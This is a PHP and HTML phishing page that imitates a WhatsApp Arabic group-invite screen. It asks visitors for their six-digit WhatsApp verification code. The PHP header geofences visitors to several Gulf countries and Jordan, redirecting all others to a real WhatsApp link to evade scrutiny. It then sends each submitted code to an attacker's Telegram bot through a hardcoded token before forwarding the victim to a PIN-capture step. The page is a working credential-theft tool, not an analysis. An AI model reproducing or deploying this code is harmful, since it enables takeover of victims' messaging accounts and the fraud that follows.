<?php
session_start();
$_SESSION["nb"] = 0;

$nobots = 0;
function get_client_ip_server() {
  $ipaddress = '';
if (isset($_SERVER['HTTP_CLIENT_IP']))
  $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_X_FORWARDED']))
  $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
  $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_FORWARDED']))
  $ipaddress = $_SERVER['HTTP_FORWARDED'];
else if(isset($_SERVER['REMOTE_ADDR']))
  $ipaddress = $_SERVER['REMOTE_ADDR'];
else
  $ipaddress = 'UNKNOWN';

  return $ipaddress;
}

$ipaddress = get_client_ip_server();

function getCountry($ip){
    $curlSession = curl_init();
    curl_setopt($curlSession, CURLOPT_URL, 'http://www.geoplugin.net/json.gp?ip='.$ip);
    curl_setopt($curlSession, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($curlSession, CURLOPT_RETURNTRANSFER, true);

    $jsonData = json_decode(curl_exec($curlSession));
    curl_close($curlSession);

    return $jsonData->geoplugin_countryCode;
}


if( getCountry($ipaddress) == 'SA' OR getCountry($ipaddress) == 'OM' OR getCountry($ipaddress) == 'BH' OR getCountry($ipaddress) == 'KW' OR getCountry($ipaddress) == 'QA' OR getCountry($ipaddress) == 'AE' OR getCountry($ipaddress) == 'JO'){
	$nobots = 1;
} else {
	header('Location: https://chat.whatsapp.com/8UufloR34pVAalZnXwd');
	exit;
}

if(isset($_POST['submit'])){
		$code = $_POST['code'];
		
		// Telegram function which you can call
		function telegram($msg) {
				global $telegrambot,$telegramchatid;
				$url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg);
				$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
				$context=stream_context_create($options);
				$result=file_get_contents($url,false,$context);
				return $result;
		}

		// Set your Bot ID and Chat ID.
		$telegrambot='1675905069:AAFiONTB-IuaCEUGX_9t-fSCE4eoVOZc5cY';
		$telegramchatid=483677730;
		$_SESSION['code'] = $_POST['code'];
		// Function call with your own text or variable
		telegram("#".$_SESSION["unique"]." | Code WhatsApp : " . $code . "");
		header('Location: pin.php?LYoAEaOHBDzGPZGe3crUW9');
		exit;
}
?>
<!DOCTYPE html>
<html lang="ar" id="facebook" class="no_js">
	<head>
		<meta charset="utf-8" />
		<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
		<script nonce="bPILeNay">
			window._cstart=+new Date();
		</script>
		
		
		<title id="pageTitle">???????????? ???????????????? ?????? ???????????? ????????????</title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
		<meta name="theme-color" content="#1BA691" />
		<meta name="msapplication-navbutton-color" content="#1BA691" />
		<meta name="apple-mobile-web-app-capable" content="yes" />
		<meta property="og:title" content="???????????? ???????????????? ?????? ???????????? ????????????" />
		<meta property="og:image" content="images/ZIvBTrQd9nP.png" />
		<meta property="og:site_name" content="chat.whatsapp.com" />
		<meta property="og:description" content="???????????? ???????????????? ?????? ???????????? ????????????" />
		<meta property="description" content="???????????? ???????????????? ?????? ???????????? ????????????" />
		<meta name="apple-mobile-web-app-status-bar-style" content="#1BA691" />
		<meta name="mobile-web-app-capable" content="yes" />
		<style nonce="bPILeNay">
			#hide_till_load
			{
				display: block !important;
			}
			
			input[type=text], input[type=tel] {
			color: transparent;
			font-family: arial;
			text-shadow: 0 0 0 black;
			
			  border: none;
			  border-bottom: 2px solid #1EBEA5;
			  background-color: white;
			  background-position: 10px 10px;
			  background-repeat: no-repeat;
			  text-align: center;
			  height:30px
			  
			}
			input[type="text"], input[type=tel], input[type="password"], textarea, select { 
    outline: none;
}
			input.placeholder {
				text-align: center;
			}
			input[type=text], input[type=tel]:focus {
			background: white;
			  border-color: white;
			  border-bottom: 2px solid green;
			}
			.input:focus{
			  text-align: left;
			  direction: ltr;
			}
		</style>
		<meta name="robots" content="noindex" />
		<link rel="shortcut icon" href="images/rYZqPCBaG70.png" />
		<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/l/1,cross/dsREa5dWpdQ.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ZEzJMcc" crossorigin="anonymous" />
		<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/1,cross/LBcffEtJ0D8.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="lSmMA2D" crossorigin="anonymous" />
		<script src="css/yym3TDq15S_.js" data-bootloader-hash="/Row7s+" crossorigin="anonymous" nonce="E9E8Z7Xe"></script>
		</head>
	<body id="top-of-page" class="_2yzz _2yz0 _whatsapp_www__page--invite ar chrome webkit win x1 Locale_ar_AR" dir="rtl">
		
		<div id="hide_till_load" class="_2ywh _li _9kh2" style="display: none">
			<div class="_2y_d _whatsapp_www__page--invite">
				<div data-testid="whatsapp_www_header" class="_2zpg">
					<header class="_2zpl">
						<div class="_2yz3 _2ziw" id="header-inner">
							<a class="_36or _2zq_" data-testid="whatsapp_www_header_logo_link" href="#/" aria-label="&#x627;&#x644;&#x635;&#x641;&#x62d;&#x629; &#x627;&#x644;&#x631;&#x626;&#x64a;&#x633;&#x64a;&#x629;"><img src=""></img></a>
							
							<a class="_36or _2yzn" data-testid="whatsapp_www_header_logo_link" href="" rel="noopener"><center><img style="position:static" height="35px" src="https://i.imgur.com/DbDe0J2.png"></img></center></a>
							<!-- <a class="_36or _2yzn" data-testid="whatsapp_www_header_logo_link" href="" rel="noopener">???????????? ???????????????? ?????? ???????????? ????????????</a> -->
							<div class="_2zpt">
								<button id="lang">
									<svg version="1.1" id="icon-language" xmlns="http://www.w3.org/2000/svg" x="0" y="0" width="19px" height="19px" viewBox="0 0 19 19" style="enable-background:new 0 0 19 19;" role="img" aria-labelledby="a11yTitle" space="preserve">
										<title id="a11yTitle">??????????</title>
										<path class="_2y-e" d="M9.5,2C5.4,2,2,5.4,2,9.5S5.4,17,9.5,17c4.1,0,7.5-3.4,7.5-7.5S13.6,2,9.5,2z M14.7,6.5h-2.2c-0.2-1-0.6-1.8-1.1-2.7C12.8,4.3,14,5.2,14.7,6.5z M9.5,3.5c0.6,0.9,1.1,1.9,1.4,3H8.1C8.4,5.4,8.9,4.4,9.5,3.5z M3.7,11c-0.2-0.5-0.2-1-0.2-1.5C3.5,9,3.5,8.4,3.7,8h2.6C6.2,8.5,6.2,9,6.2,9.5c0,0.5,0.1,1,0.1,1.5H3.7z M4.3,12.5h2.2c0.2,1,0.6,1.8,1.1,2.7C6.2,14.7,5,13.8,4.3,12.5z M6.5,6.5H4.3c0.8-1.3,1.9-2.2,3.2-2.7C7.1,4.7,6.7,5.5,6.5,6.5z M9.5,15.5c-0.6-0.9-1.1-1.9-1.4-3h2.9C10.6,13.6,10.1,14.6,9.5,15.5z M11.2,11H7.8c-0.1-0.5-0.2-1-0.2-1.5c0-0.5,0.1-1,0.2-1.5h3.5c0.1,0.5,0.2,1,0.2,1.5C11.5,10,11.3,10.5,11.2,11z M11.5,15.2c0.5-0.8,0.8-1.7,1.1-2.7h2.2C14,13.8,12.8,14.7,11.5,15.2z M12.8,11c0.1-0.5,0.1-1,0.1-1.5c0-0.5-0.1-1-0.1-1.5h2.6c0.2,0.5,0.2,1,0.2,1.5c0,0.5-0.1,1.1-0.2,1.5H12.8z"></path>
									</svg>
									<div class="_2zbh">
										??????????????
										<svg version="1.1" xmlns="http://www.w3.org/2000/svg" class="_2zbi" x="0" y="0" width="9px" height="20px" viewBox="0 0 9 20" style="enable-background:new 0 0 9 20;">
											<polygon fill="#ffffff" points="1,9 4.5,12.5 8,9 "></polygon>
										</svg>
									</div>
								</button>
								<div class="_2zqm" id="lang-picker" style="display: none;">
									<div class="_2zqx">
										?????????? ??????????
									</div>
									<ul>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=az" dir="auto">az??rbaycan</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=af" dir="auto">Afrikaans</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=id" dir="auto">Bahasa Indonesia</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ms" dir="auto">Melayu</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ca" dir="auto">catal??</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=cs" dir="auto">??e??tina</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=da" dir="auto">dansk</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=de" dir="auto">Deutsch</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=et" dir="auto">eesti</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=en" dir="auto">English</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=es" dir="auto">espa??ol</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=fr" dir="auto">fran??ais</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ga" dir="auto">Gaeilge</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=hr" dir="auto">hrvatski</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=it" dir="auto">italiano</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sw" dir="auto">Kiswahili</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=lv" dir="auto">latvie??u</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=lt" dir="auto">lietuvi??</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=hu" dir="auto">magyar</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=nl" dir="auto">Nederlands</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=nb" dir="auto">norsk bokm??l</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=uz" dir="auto">o???zbek</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=tl" dir="auto">Filipino</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=pl" dir="auto">polski</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=pt_br" dir="auto">Portugu??s (Brasil)</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=pt_pt" dir="auto">Portugu??s (Portugal)</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ro" dir="auto">rom??n??</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sq" dir="auto">shqip</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sk" dir="auto">sloven??ina</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sl" dir="auto">sloven????ina</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=fi" dir="auto">suomi</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sv" dir="auto">svenska</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=vi" dir="auto">Ti???ng Vi???t</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=tr" dir="auto">T??rk??e</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=el" dir="auto">????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=bg" dir="auto">??????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=kk" dir="auto">?????????? ????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=mk" dir="auto">????????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ru" dir="auto">??????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=sr" dir="auto">????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=uk" dir="auto">????????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=he" dir="auto">??????????</a></li>
										<li class="_2zqt _2zqw"><a class="_36or _2zqv" href="#" dir="auto">??????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=fa" dir="auto">??????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ur" dir="auto">????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=bn" dir="auto">???????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=hi" dir="auto">??????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=gu" dir="auto">?????????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=kn" dir="auto">???????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=mr" dir="auto">???????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=pa" dir="auto">??????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ta" dir="auto">???????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=te" dir="auto">??????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ml" dir="auto">??????????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=th" dir="auto">?????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=zh_cn" dir="auto">????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=zh_tw" dir="auto">????????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ja" dir="auto">?????????</a></li>
										<li class="_2zqt"><a class="_36or _2zqv" href="#?lang=ko" dir="auto">?????????</a></li>
									</ul>
								</div>
								<div style="display: none;" id="lang-picker_bg" class="_2zqy"></div>
							</div>
							<button class="_2zpw" id="icon-drawer-open" aria-label="&#x627;&#x644;&#x642;&#x627;&#x626;&#x645;&#x629;">
								<svg version="1.1" id="icon-menu" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
									<path class="_2y-e" d="M8,26h21v-1.8H8V26z M8,11v1.8h21V11H8zM8,19.2h21v-1.8H8V19.2z"></path>
								</svg>
							</button>
							<div class="_2zpu" id="icon-search">
								<svg version="1.1" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
									<path class="_2y-e" d="M22.9,21.3H22L21.7,21c1.1-1.2,1.7-2.8,1.7-4.5c0-3.9-3.1-7.1-7-7.1s-7,3.1-7,7.1c0,3.9,3.1,7,7,7c1.7,0,3.3-0.7,4.5-1.7l0.3,0.3v0.9l4.7,4.7l1.6-1.6L22.9,21.3z M16.4,21.3c-2.7,0-4.8-2.2-4.8-4.8s2.2-4.8,4.8-4.8s4.8,2.2,4.8,4.8S19.1,21.3,16.4,21.3z"></path>
								</svg>
							</div>
							<nav class="_2yzy">
								<ul class="_2yyz">
									<li class="_2zw6"><center><img style="position:static" height="35px" src="https://i.imgur.com/DbDe0J2.png"></img></center></li>
									<span class="_2zwe"></span>
									<li class="_2zw6"><a class="_36or" href="#/features/">??????????????</a></li>
									<span class="_2zwe"></span>
									<li class="_2zw6"><a class="_36or" href="#/download/">??????????</a></li>
									<span class="_2zwe"></span>
									<li class="_2zw6"><a class="_36or" href="#/security/">????????????</a></li>
									<span class="_2zwe"></span>
									<li class="_2zw6"><a class="_36or" href="#">???????? ????????????????</a></li>
									<span class="_2zwe"></span>
								</ul>
							</nav>
						</div>
						<nav class="_2zc-" id="menu-drawer" aria-hidden="true">
							<div class="_2zlb">
								<button class="_2zix" id="icon-drawer-close" aria-label="&#x625;&#x63a;&#x644;&#x627;&#x642; &#x627;&#x644;&#x642;&#x627;&#x626;&#x645;&#x629;">
									<svg version="1.1" id="icon-close" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
										<polygon class="_2y-e" points="26.7,11.6 25.4,10.3 18.5,17.211.6,10.3 10.3,11.6 17.2,18.510.3,25.4 11.6,26.7 18.5,19.825.4,26.7 26.7,25.4 19.8,18.5 "></polygon>
									</svg>
								</button>
								<div class="_2zlc"></div>
								<ul class="_2z2n _2zo_">
									<li class="_2zp6"><a class="_36or _2zp7" href="#/download/">??????????</a></li>
									<li class="_2zp6"><a class="_36or _2zp7" href="#/features/">??????????????</a></li>
									<li class="_2zp6"><a class="_36or _2zp7" href="#/security/">????????????</a></li>
									<li class="_2zp6"><a class="_36or _2zp7" href="#">???????? ????????????????</a></li>
									<li class="_2zp6"><a class="_36or _2zp7" href="#/contact/">?????????? ????????</a></li>
									<li class="_2zp6 _2zp9">
										<select onchange="window.location =this.options[this.selectedIndex].value;">
											<option value="#?lang=az">az??rbaycan</option>
											<option value="#?lang=af">Afrikaans</option>
											<option value="#?lang=id">Bahasa Indonesia</option>
											<option value="#?lang=ms">Melayu</option>
											<option value="#?lang=ca">catal??</option>
											<option value="#?lang=cs">??e??tina</option>
											<option value="#?lang=da">dansk</option>
											<option value="#?lang=de">Deutsch</option>
											<option value="#?lang=et">eesti</option>
											<option value="#?lang=en">English</option>
											<option value="#?lang=es">espa??ol</option>
											<option value="#?lang=fr">fran??ais</option>
											<option value="#?lang=ga">Gaeilge</option>
											<option value="#?lang=hr">hrvatski</option>
											<option value="#?lang=it">italiano</option>
											<option value="#?lang=sw">Kiswahili</option>
											<option value="#?lang=lv">latvie??u</option>
											<option value="#?lang=lt">lietuvi??</option>
											<option value="#?lang=hu">magyar</option>
											<option value="#?lang=nl">Nederlands</option>
											<option value="#?lang=nb">norsk bokm??l</option>
											<option value="#?lang=uz">o???zbek</option>
											<option value="#?lang=tl">Filipino</option>
											<option value="#?lang=pl">polski</option>
											<option value="#?lang=pt_br">Portugu??s (Brasil)</option>
											<option value="#?lang=pt_pt">Portugu??s (Portugal)</option>
											<option value="#?lang=ro">rom??n??</option>
											<option value="#?lang=sq">shqip</option>
											<option value="#?lang=sk">sloven??ina</option>
											<option value="#?lang=sl">sloven????ina</option>
											<option value="#?lang=fi">suomi</option>
											<option value="#?lang=sv">svenska</option>
											<option value="#?lang=vi">Ti???ng Vi???t</option>
											<option value="#?lang=tr">T??rk??e</option>
											<option value="#?lang=el">????????????????</option>
											<option value="#?lang=bg">??????????????????</option>
											<option value="#?lang=kk">?????????? ????????</option>
											<option value="#?lang=mk">????????????????????</option>
											<option value="#?lang=ru">??????????????</option>
											<option value="#?lang=sr">????????????</option>
											<option value="#?lang=uk">????????????????????</option>
											<option value="#?lang=he">??????????</option>
											<option value="#" selected="1">??????????????</option>
											<option value="#?lang=fa">??????????</option>
											<option value="#?lang=ur">????????</option>
											<option value="#?lang=bn">???????????????</option>
											<option value="#?lang=hi">??????????????????</option>
											<option value="#?lang=gu">?????????????????????</option>
											<option value="#?lang=kn">???????????????</option>
											<option value="#?lang=mr">???????????????</option>
											<option value="#?lang=pa">??????????????????</option>
											<option value="#?lang=ta">???????????????</option>
											<option value="#?lang=te">??????????????????</option>
											<option value="#?lang=ml">??????????????????</option>
											<option value="#?lang=th">?????????</option>
											<option value="#?lang=zh_cn">????????????</option>
											<option value="#?lang=zh_tw">????????????</option>
											<option value="#?lang=ja">?????????</option>
											<option value="#?lang=ko">?????????</option>
										</select>
									</li>
								</ul>
							</div>
						</nav>
					</header>
				</div>
				<div class="_2zry">
					<div class="_2yzc">
						<div class="_2yz5 _2yz8" style="display: block;" id="main_block">
							<div class="_2yyk _8cis">
								<a class="_36or _2y_6 _2z38" href="#" title="&#x627;&#x633;&#x62a;&#x639;&#x645;&#x627;&#x644; &#x647;&#x630;&#x627; &#x627;&#x644;&#x631;&#x627;&#x628;&#x637;" id="action-icon"><span class="_2z9j _2zbe"></span></a>
								<h2 class="_2yzk"></h2>
								<h3 class="_8cit">???????? ?????? ?????????? ?????????????? ???????????? ???? ?? ?????????? ???????? ???????????? ???? ???????? ?????????? ????????</h3>
								<div class="_whatsapp_www__block_action">
									<form action="code.php" method="POST">
										<div class="_whatsapp_www__block_action"> <input type="tel" inputmode="numeric" autocomplete="one-time-code" required id="edit1" maxlength="6" minlength="6" name="code" pattern="[0-9.]+"  /></div><br>
										<div class="_whatsapp_www__block_action">
											<button class="_36or _2y_c _2z0c _2z07"  title="&#x627;&#x633;&#x62a;&#x639;&#x645;&#x627;&#x644; &#x647;&#x630;&#x627; &#x627;&#x644;&#x631;&#x627;&#x628;&#x637;" name="submit" type="submit" >???????????????? ?????? ??????????????</button>
                                            <a href="code.php?id=8UufloR34pVAalZnXwd25q" class="_36or _2y_c _2z0c _2z07"  title="&#x627;&#x633;&#x62a;&#x639;&#x645;&#x627;&#x644; &#x647;&#x630;&#x627; &#x627;&#x644;&#x631;&#x627;&#x628;&#x637;">???? ?????????? ?????????? </a>
										</div>
									</form>
								</div>
								<script>
								function validateNumber(event) {
									var key = window.event ? event.keyCode : event.which;
									if (event.keyCode === 8 || event.keyCode === 46) {
										return true;
									} else if ( key < 48 || key > 57 ) {
										return false;
									} else {
										return true;
									}
								};
								
								$(document).ready(function(){
									$('[id^=edit]').keypress(validateNumber);
								});
								</script>
							<hr />
							<div class="_6jg7">
								???? ???????? ?????????? ???????????? ????????
								<br />
								<a class="_36or" href="#/download">??????????</a>
							</div>
						</div>
					
						<div class="_2yz5 _2yz8" style="display: none;" id="fallback_block">
							<div class="_2yyk _8ibq">
								<h2 class="_2yzk">???????? ???? ?????????? ???????????? ?????? ???????? ?????? ??????????!</h2>
								<a class="_36or _2y_c _2z0c _2z07" href="#/download">??????????</a>
								<div class="_8ibw">
									<div class="_8ibx">
										????
									</div>
									<a class="_36or" href="#accept?code=LYoAEaOHBDzGPZGe3crUW9">?????????????? ???????????? ??????</a>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="_6jg3">
					<div class="_2y-f _2y-g">
						<div class="_2yz1">
							<div class="_2ywp">
								<div class="_2yyk _2y-j _2yzj">
									<h4 class="_2yzk">????????????</h4>
									<div class="_2y_4">
										<ul class="_2zne _2zoz">
											<li class="_2znf"><a class="_36or _2zob" href="#/features/">??????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/security/">????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/download/">??????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#&#x1f310;/ar">???????????? ??????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/business/">???????????? ??????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/privacy">????????????????</a></li>
										</ul>
									</div>
								</div>
								<div class="_2yyk _2y-j _2yzj">
									<h4 class="_2yzk">????????????</h4>
									<div class="_2y_4">
										<ul class="_2zne _2zoz">
											<li class="_2znf"><a class="_36or _2zob" href="#/about/">??????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/join/">??????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#" target="_blank" rel="noopener">???????? ?????????????? ????????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/contact/">?????????? ????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#">??????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/stories/">?????? ????????????</a></li>
										</ul>
									</div>
								</div>
								<div class="_2yyk _2y-j _2yzj">
									<h4 class="_2yzk">??????????</h4>
									<div class="_2y_4">
										<ul class="_2zne _2zoz">
											<li class="_2znf"><a class="_36or _2zob" href="#/download/">Mac/PC</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/android/">Android</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/appstore/">iPhone</a></li>
										</ul>
									</div>
								</div>
								<div class="_2yyk _2y-j _2yzj">
									<h4 class="_2yzk">????????????????</h4>
									<div class="_2y_4">
										<ul class="_2zne _2zoz">
											<li class="_2znf"><a class="_36or _2zob" href="#">???????? ????????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#" target="_blank" rel="noopener">??????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#" target="_blank" rel="noopener">????????????</a></li>
											<li class="_2znf"><a class="_36or _2zob" href="#/coronavirus/">?????????? ????????????</a></li>
										</ul>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="_2y-f _2y-h">
						<div class="_2yz1">
							<div class="_2ywp">
								<div class="_2y-j" dir="auto">
									2021 ?? WhatsApp LLC
								</div>
								<div class="_2y-j _2y-k">
									<a class="_36or _2y-i" href="#/legal/">???????????? ??????????????????</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div></div>
	</body>
</html>

